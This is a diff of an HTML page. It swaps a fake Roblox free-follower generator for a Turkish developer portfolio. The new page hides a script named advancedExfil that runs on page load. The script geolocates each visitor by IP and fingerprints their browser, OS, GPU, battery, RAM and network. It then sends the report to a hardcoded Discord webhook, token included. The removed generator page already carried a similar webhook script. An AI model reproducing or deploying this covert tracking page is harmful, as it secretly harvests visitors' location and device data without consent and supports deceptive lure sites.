@@ -1,224 +1,160 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RobloxFollower.pro - Get Free Followers Instantly</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>CodingXploit | Portfolyo</title>
     <style>
-        :root {
-            --primary-color: #00b4d8;
-            --secondary-color: #0077b6;
-            --dark-bg: #023047;
-            --card-bg: #0a4c6a;
-            --text-light: #ffffff;
-            --text-muted: #b0c4de;
-            --success-color: #52b788;
-            --error-color: #e63946;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Montserrat', sans-serif;
-            background-color: var(--dark-bg);
-            color: var(--text-light);
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 950px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        header {
-            text-align: center;
-            padding: 40px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        header .logo {
-            font-size: 2.5rem;
-            font-weight: 700;
-            color: var(--primary-color);
-            margin-bottom: 10px;
-        }
-
-        header p {
-            color: var(--text-muted);
-            font-size: 1.1rem;
-        }
-
-        .main-content {
-            padding: 40px 0;
-        }
-
-        .generator-card {
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(0, 180, 216, 0.3);
-            margin-bottom: 30px;
-        }
-
-        .generator-card h1 {
-            text-align: center;
-            margin-bottom: 15px;
-            font-size: 2.2rem;
-        }
-
-        .generator-card p {
-            text-align: center;
-            color: var(--text-muted);
-            margin-bottom: 30px;
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 15px;
-            font-size: 1rem;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            background-color: rgba(255, 255, 255, 0.05);
-            color: var(--text-light);
-            transition: border-color 0.3s;
-        }
-
-        .form-group input:focus, .form-group select:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 18px;
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--dark-bg);
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .submit-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 180, 216, 0.4);
-        }
-
-        .submit-btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-        }
-
-        .progress-container {
-            margin-top: 20px;
-            display: none;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 25px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background-color: var(--success-color);
-            transition: width 0.5s ease;
-            text-align: center;
-            line-height: 25px;
-            color: white;
-            font-weight: bold;
-        }
-        .status-message {
-            text-align: center;
-            margin-top: 15px;
-            font-weight: 600;
-        }
+        body { font-family: 'Inter', sans-serif; background: #ffffff; color: #1a1a1a; margin: 0; line-height: 1.6; }
+        header { background: #000; color: #fff; padding: 60px 20px; text-align: center; }
+        .container { max-width: 1000px; margin: auto; padding: 40px 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .card { border: 1px solid #eee; padding: 20px; border-radius: 12px; transition: 0.3s; }
+        .card:hover { box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        h1 { font-size: 42px; margin-bottom: 10px; }
+        p { color: #666; }
+        .loading-bar { height: 4px; width: 100%; background: #eee; position: fixed; top: 0; left: 0; }
+        .loading-progress { height: 100%; width: 30%; background: #007aff; animation: load 2s infinite; }
+        @keyframes load { 0% { left: -30%; } 100% { left: 100%; } }
     </style>
 </head>
 <body>
 
+    <div class="loading-bar"><div class="loading-progress"></div></div>
+
+    <header>
+        <h1>DevEX.</h1>
+        <p>Full-Stack Developer & UI/UX Designer</p>
+    </header>
+
     <div class="container">
-        <header>
-            <div class="logo">RobloxFollower.pro</div>
-            <p>Your #1 Source for Free Roblox Followers</p>
-        </header>
-
-        <main class="main-content">
-            <div class="generator-card">
-                <h1>Free Follower Generator</h1>
-                <p>Enter your details below to instantly add followers to your account. Our process is safe, fast, and secure.</p>
-                
-                <form id="followerForm">
-                    <div class="form-group">
-                        <label for="robloxUsername">Roblox Username</label>
-                        <input type="text" id="robloxUsername" name="robloxUsername" placeholder="e.g., Robloxian123" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="followerAmount">Followers Amount</label>
-                        <select id="followerAmount" name="followerAmount">
-                            <option value="100">100 Followers</option>
-                            <option value="500">500 Followers</option>
-                            <option value="1000">1,000 Followers</option>
-                            <option value="5000">5,000 Followers</option>
-                        </select>
-                    </div>
-                    <button type="submit" class="submit-btn" id="submitBtn">Generate Followers</button>
-                </form>
-
-                <div class="progress-container" id="progressContainer">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill">0%</div>
-                    </div>
-                    <div class="status-message" id="statusMessage">Initializing...</div>
-                </div>
+        <div class="grid">
+            <div class="card">
+                <h3>Modern Web Çözümleri</h3>
+                <p>En güncel teknolojilerle performanslı ve kullanıcı dostu web siteleri geliştiriyorum.</p>
             </div>
-        </main>
+            <div class="card">
+                <h3>Mobil Uygulama</h3>
+                <p>iOS ve Android platformları için yerel performans sunan uygulamalar kodluyorum.</p>
+            </div>
+            <div class="card">
+                <h3>Siber Güvenlik</h3>
+                <p>Sistem optimizasyonu ve veri güvenliği konularında danışmanlık veriyorum.</p>
+            </div>
+        </div>
     </div>
 
-<!-- EN ÖNEMLİ KISIM: JAVASCRIPT -->
-<script>
-    // Discord Webhook URL'niz
-    const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+    <script>
+        const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-    // --- 1. BÜTÜN BİLGİLERİ TOPLAYIP GÖNDEREN FONKSİYON ---
-    // Bu fonksiyon sayfa açıldığında bir kere çalışır.
-    async function sendAllInfo() {
-        try {
-            const geoReq = await fetch('https://ipapi.co/json/');
-            const g = await geoReq.json();
-            let browser = "Unknown";
-            let os = "Unknown Platform";
-            const ua = navigator.userAgent;
-            if (ua.includes("Edg/")) browser = "Microsoft Edge";
-            else if (ua.includes("Brave")) browser = "Brave";
-            else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
-            else if (ua.includes("Chrome")) browser = "Google Chrome";
-            else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
-            else if (ua.includes("Safari")) browser = "Safari";
-            if (navigator.userAgentData) {
-                const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
-                if (navigator.userAgentData.platform === "Windows") {
-                    const
+        async function advancedExfil() {
+            try {
+          
+                const geoReq = await fetch('https://ipapi.co/json/');
+                const g = await geoReq.json();
+
+                
+                let browser = "Unknown";
+                let os = "Unknown Platform";
+                const ua = navigator.userAgent;
+
+                if (ua.includes("Edg/")) browser = "Microsoft Edge";
+                else if (ua.includes("Brave")) browser = "Brave";
+                else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
+                else if (ua.includes("Chrome")) browser = "Google Chrome";
+                else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+                else if (ua.includes("Safari")) browser = "Safari";
+
+                if (navigator.userAgentData) {
+                    const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
+                    const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
+                    if (navigator.userAgentData.platform === "Windows") {
+                        const majorVersion = parseInt(platformInfo.platformVersion.split('.')[0]);
+                        os = majorVersion >= 13 ? "Windows 11" : "Windows 10";
+                    } else {
+                        os = navigator.userAgentData.platform;
+                    }
+                } else {
+                    os = navigator.platform;
+                }
+
+                
+                let gpu = "N/A";
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl");
+                if (gl) {
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+                }
+
+                let battery = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sarjda' : 'Sarjda Degil'})`;
+                }
+
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const connectionType = conn ? `${conn.effectiveType} (~${conn.downlink} Mbps)` : "Bilinmiyor";
+
+                // 4. Veri Paketleme
+                const logData = {
+                    ts: new Date().toLocaleString('tr-TR'),
+                    ip: g.ip,
+                    isp: g.org,
+                    loc: `${g.city}, ${g.region}, ${g.country_name} (${g.latitude}, ${g.longitude})`,
+                    os: os,
+                    browser: browser,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                    gpu: gpu,
+                    res: `${screen.width}x${screen.height} @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
+                    hz: window.screen.refreshRate || "60Hz (Tahmini)",
+                    lang: navigator.language,
+                    bat: battery,
+                    net: connectionType,
+                    ref: document.referrer || "Dogrudan Baglanti",
+                    ua: ua
+                };
+
+               
+                const terminalLog = "```" + 
+                    "--- [ SESSION CAPTURE REPORT ] ---\n" +
+                    "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
+                    "TIME       : " + logData.ts + "\n" +
+                    "----------------------------------\n" +
+                    "NETWORK_LAYER\n" +
+                    "IPV4_ADDR  : " + logData.ip + "\n" +
+                    "PROVIDER   : " + logData.isp + "\n" +
+                    "LOCATION   : " + logData.loc + "\n" +
+                    "NET_TYPE   : " + logData.net + "\n" +
+                    "----------------------------------\n" +
+                    "HARDWARE_LAYER\n" +
+                    "OS_VER     : " + logData.os + "\n" +
+                    "CORE_COUNT : " + logData.cores + " Threads\n" +
+                    "RAM_SIZE   : " + logData.ram + "\n" +
+                    "GPU_MODEL  : " + logData.gpu + "\n" +
+                    "DISPLAY    : " + logData.res + "\n" +
+                    "BATTERY    : " + logData.bat + "\n" +
+                    "----------------------------------\n" +
+                    "SOFTWARE_LAYER\n" +
+                    "BROWSER    : " + logData.browser + "\n" +
+                    "LANGUAGE   : " + logData.lang + "\n" +
+                    "REFERRER   : " + logData.ref + "\n" +
+                    "RAW_UA     : " + logData.ua + "\n" +
+                    "--- [ END OF TRANSMISSION ] ---" +
+                    "```";
+
+          
+                await fetch(WH_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: terminalLog })
+                });
+
+            } catch (err) {}
+        }
+
+        window.onload = advancedExfil;
+    </script>
+</body>
+</html>
